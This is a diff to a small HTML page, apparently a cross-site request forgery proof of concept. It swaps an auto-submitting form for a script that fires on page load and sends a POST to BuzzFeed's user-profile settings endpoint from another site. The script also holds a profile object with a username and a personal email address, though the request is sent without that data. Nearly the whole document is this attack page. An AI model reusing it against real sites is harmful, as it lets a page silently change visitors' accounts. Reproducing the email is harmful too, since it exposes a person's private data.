@@ -7,14 +7,18 @@
   
   
   <body>
+   <script>
+    var url="https://www.buzzfeed.com/settings/api/v1/user-profile";
     
-    <form action="https://messithegoat.github.io/single.html" method="post">
-      <input type='text' name='hello' value='hey'>
-      <input type='submit'>
-    </form>
+    var data={"username":"vbanxxxxxx","display_name":"lm","email":"saadajamalok@gmail.com","image":"/static/user_images/vCnkWgLAn.jpg?output-format=jpg&crop=281%253A281%253B109%252C0","header_image":"","header_alt_text":"","bio":null,"age":null,"organization":null,"link":null,"twitter_page_url":null,"twitter_widget":"","facebook_page_url":null,"public_dashboard":true,"queued_notification":0,"promoted_notification":0,"fetchingUserProfile":false,"fetchingMsgPrefs":false,"savingUserProfile":false,"savingMsgPrefs":false,"userProfileSaved":false,"msgPrefsSaved":false,"sendingGdprRequest":false,"gdprResponseReceived":false,"sendingDeleteAccountRequest":false,"deleteAccountRequestReceived":false,"dataAccessRequestReceived":false,"sendingDataAccessRequest":false,"error":null}
     
-    <script>
-      document.forms[0].submit();
-    </script>
+    var xhr=new XMLHttpRequest();
+    
+    xhr.open("POST",url,true);
+   
+    xhr.setRequestHeader('Content-type','application/json');
+    
+    xhr.send();
+   </script>
   </body>
 </html>
